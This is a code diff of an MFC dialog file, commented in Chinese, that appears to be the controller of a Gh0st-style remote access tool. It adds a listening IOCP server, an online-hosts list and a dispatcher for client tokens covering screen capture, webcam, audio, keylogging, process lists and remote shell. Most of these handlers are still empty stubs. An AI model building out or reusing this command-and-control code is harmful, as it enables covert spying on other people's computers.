@@ -2,18 +2,26 @@
 // UIDlg.cpp: 实现文件
 //
 
+
 #include "pch.h"
+#include <WS2tcpip.h>
 #include "framework.h"
 #include "UI.h"
 #include "UIDlg.h"
 #include "afxdialogex.h"
 #include "CSettingDlg.h"
 #include "macros.h"
+#include "Macros/macros.h"
+
+//using namespace std;
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
+
+CIOCPServer *g_iocpServer = nullptr;
+CUIDlg		*g_UIDlg	  = nullptr;
 
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
 
@@ -49,9 +57,6 @@ END_MESSAGE_MAP()
 
 
 // CUIDlg 对话框
-
-
-
 CUIDlg::CUIDlg(CWnd* pParent /*=nullptr*/)
 	: CDialogEx(IDD_UI_DIALOG, pParent)
 {
@@ -59,6 +64,13 @@ CUIDlg::CUIDlg(CWnd* pParent /*=nullptr*/)
 	m_hMenu = nullptr;
 	m_nWndWidth = NULL;
 	ZeroMemory(&m_nifNotify, sizeof(m_nifNotify));
+	g_iocpServer = new CIOCPServer;
+	g_UIDlg = this;
+}
+
+CUIDlg::~CUIDlg()
+{
+	delete g_iocpServer;
 }
 
 // 加载UI
@@ -117,9 +129,10 @@ void CUIDlg::InitToolBar()
 // 在线主机列表
 void CUIDlg::InitOnlineListCtrl()
 {
-	m_lcOnline.SetExtendedStyle(LVS_EX_FULLROWSELECT);
+	
 
 	for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
+		m_lcOnline.SetExtendedStyle(LVS_EX_FULLROWSELECT);
 		m_lcOnline.InsertColumn(i,
 								g_uiOnlineColumn[i].chTitle,
 								LVCFMT_CENTER,
@@ -127,31 +140,11 @@ void CUIDlg::InitOnlineListCtrl()
 	}
 
 
+
 	// test
-	CString strColumn[] = { "127.0.0.1",
-							"本地",
-							"lenovo",
-							"win10",
-							"xen",
-							"yes",
-							"100M" };
-
-	for (INT i = 0; i < UI_ONLINE_COLUMNS; ++i) {
-		g_uiOnlineColumn[i].strContext = &strColumn[i];
-	}
-	AddOnline();
-}
-
-
-// 添加到上线列表
-void CUIDlg::AddOnline()
-{
-	PUI_COLUMN pColumn = g_uiOnlineColumn;
-	m_lcOnline.InsertItem(0, *(pColumn[0].strContext));
-
-	for (INT i = 1; i < UI_ONLINE_COLUMNS; ++i) {
-		m_lcOnline.SetItemText(0, i, *(pColumn[i].strContext));
-	}
+	std::initializer_list<LPCTSTR> context = { "127.0.0.1", "本地1", "lenovo", 
+											   "win10", "xen", "yes", "100M" };
+	AddContextListCtrol(m_lcOnline, context);
 }
 
 
@@ -171,28 +164,30 @@ void CUIDlg::InitEventLogListCtrl()
 	}
 
 	// test
-	CString strColumn[] = { "成功",
-							GetSystemTime(),
-							"测试" };
-
-	for (INT i = 0; i < UI_EVENTLOG_COLUMNS; ++i) {
-		g_uiEventLogColumn[i].strContext = &strColumn[i];
-	}
-	AddEventLog();
+	//std::initializer_list<LPCTSTR> context = { "成功", "测试" };
+	//AddContextListCtrol(m_lcEventLog, context);
 }
 
 
-// 添加到事件日志列表
-void CUIDlg::AddEventLog()
+// 添加内容到列表控件
+void CUIDlg::AddContextListCtrol(CListCtrl &lc, std::initializer_list<LPCTSTR> context)
 {
-	PUI_COLUMN pColumn = g_uiEventLogColumn;
-	m_lcEventLog.InsertItem(0, *(pColumn[0].strContext));
+	UINT i = 1;
 
-	for (INT i = 1; i < UI_EVENTLOG_COLUMNS; ++i) {
-		m_lcEventLog.SetItemText(0, i, *(pColumn[i].strContext));
+	for (auto ctx : context) {
+		CString Begin = *(context.begin());
+		if (ctx == Begin && lc == m_lcOnline) {
+			lc.InsertItem(0, ctx);
+			continue;
+		}
+		else if (ctx == Begin && lc == m_lcEventLog) {
+			lc.InsertItem(0, GetSystemTime());
+		}
+
+		lc.SetItemText(0, i, ctx);
+		++i;
 	}
 }
-
 
 // 状态栏
 void CUIDlg::InitStatusBar()
@@ -236,6 +231,62 @@ CString CUIDlg::GetSystemTime()
 	return t.Format("%Y-%m-%d %H:%M:%S");
 }
 
+
+// 开始网络处理
+void CUIDlg::StartNetwork()
+{
+	char szHostName[MAX_PATH] = { 0 }, 
+		 szBuf[MAX_PATH]	  = { 0 },
+		 szAddrList[MAX_PATH] = { 0 };
+	ADDRINFOA AddrInfo, *Result = nullptr, *p = nullptr;
+	SOCKADDR_IN *pAddr = nullptr;
+	CString strEventLog;
+
+	// 从ini配置文件读取端口、最大连接数
+	CIniFile &IniFile   = ((CUIApp *)AfxGetApp())->m_iniFile;
+	UINT nPort          = (UINT)IniFile.GetInt("Settings", "ListenPort");
+	UINT nMaxConnection = (UINT)IniFile.GetInt("Settings", "MaxConnection");
+
+	// 程序运行时，如果没有进行参数设置时，将参数设为默认值
+	if (0 == nPort || 0 == nMaxConnection) {
+		nPort			= DEFAULT_PORT;
+		nMaxConnection	= DEFAULT_MAX_CONNECTION;
+	}
+
+	/*
+	 * start iocp server
+	 */
+	if (g_iocpServer->Initialize(NotifyProc, NULL, 10000, nPort)) {
+		gethostname(szHostName, sizeof(szHostName));
+
+		ZeroMemory(&AddrInfo, sizeof(AddrInfo));
+		AddrInfo.ai_family	 = AF_INET;
+		AddrInfo.ai_socktype = SOCK_STREAM;
+		AddrInfo.ai_protocol = IPPROTO_TCP;
+		if (!getaddrinfo(szHostName, NULL, &AddrInfo, &Result)) {
+			for (p = Result; p != nullptr; p = p->ai_next) {
+				pAddr = (SOCKADDR_IN *)p->ai_addr;
+				inet_ntop(AF_INET, &pAddr->sin_addr, szBuf, sizeof(szBuf));
+				strncat_s(szAddrList, szBuf, sizeof(szBuf));
+
+				if (p->ai_next) {
+					strncat_s(szAddrList, " / ", 3);
+				}
+			}
+		}
+
+		strEventLog.Format("本机IP %s 端口 %d 最大连接数 %d", szAddrList, nPort, nMaxConnection);
+		std::initializer_list<LPCTSTR> context = {"网络初始化", strEventLog};
+		AddContextListCtrol(m_lcEventLog, context);
+	} else {
+		std::initializer_list<LPCTSTR> context = { "网络初始化失败" };
+		AddContextListCtrol(m_lcEventLog, context);
+	}
+
+
+}
+
+
 void CUIDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
@@ -250,15 +301,123 @@ BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
 	ON_WM_SIZE()
 
 	// 自定义消息处理
-	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT ( __thiscall CWnd::* )(WPARAM, LPARAM))&CUIDlg::OnIconNotify)
+	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd:: *)(WPARAM, LPARAM)) &CUIDlg::OnIconNotify)
+	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)
 
 	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
 	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
-	ON_NOTIFY((WORD)NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
+	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
 END_MESSAGE_MAP()
 
 
-// CUIDlg 消息处理程序
+// 网络连接事件通知处理回调函数
+void CUIDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
+{
+	try {
+		switch (nCode) {
+		case NC_CLIENT_CONNECT:
+			// todo
+			break;
+
+		case NC_CLIENT_DISCONNECT:
+			// todo
+			break;
+
+		case NC_TRANSMIT:
+			// todo
+			break;
+
+		case NC_RECEIVE:
+			// todo
+			break;
+
+		case NC_RECEIVE_COMPLETE:
+			ProcessReceiveComplete(pContext);
+			break;
+		}
+	}
+	catch (...) {}
+
+
+}
+
+
+// 完全接收处理
+void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
+{
+	if (!pContext) {
+		return;
+	}
+
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog *dlg = (CDialog *)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
+
+	//如果没有赋值就判断是否是上线包和打开功能功能窗口
+	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
+		// 要求验证
+	case TOKEN_AUTH:
+		//m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
+		break;
+
+		// 回复心跳包
+	case TOKEN_HEARTBEAT:
+		/*BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));*/
+		break;
+
+		// 上线包
+	case TOKEN_LOGIN:
+	{
+		//确定连接数是否到达上限
+		UINT cnt = (UINT)g_UIDlg->m_lcOnline.GetItemCount();
+		if (g_iocpServer->m_nMaxConnections <= cnt) {
+			closesocket(pContext->m_Socket);
+		} else {
+			pContext->m_bIsMainSocket = true;
+			/* 发送上线消息 */
+			g_UIDlg->PostMessage(WM_ADDONLINE, 0, (LPARAM)pContext);
+		}
+		// 激活
+		BYTE	bToken = COMMAND_ACTIVED;
+		g_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		break;
+	}
+
+	case TOKEN_DRIVE_LIST: // 驱动器列表
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		//g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_BITMAPINFO: //
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+		//g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+		//g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_AUDIO_START: // 语音
+		//g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_KEYBOARD_START:
+		//g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_PSLIST:
+		//g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_SHELL_START:
+		//g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
+		// 命令停止当前操作
+	default:
+		closesocket(pContext->m_Socket);
+		break;
+	}
+}
 
 BOOL CUIDlg::OnInitDialog()
 {
@@ -291,12 +450,14 @@ BOOL CUIDlg::OnInitDialog()
 
 	// 加载UI
 	LoadUI();
-
 	// 改变窗口的大小，触发窗口onsize()
 	CRect r;
 	GetWindowRect(&r);
 	r.top += 1;
 	MoveWindow(&r);
+
+	// 开始网络处理
+	StartNetwork();
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
@@ -448,6 +609,14 @@ void CUIDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 	default:
 		break;
 	}
+}
+
+
+// 上线通知
+LRESULT CUIDlg::OnAddOnline(WPARAM wParam, LPARAM lParam)
+{
+	AfxMessageBox("有连接");
+	return LRESULT();
 }
 
 
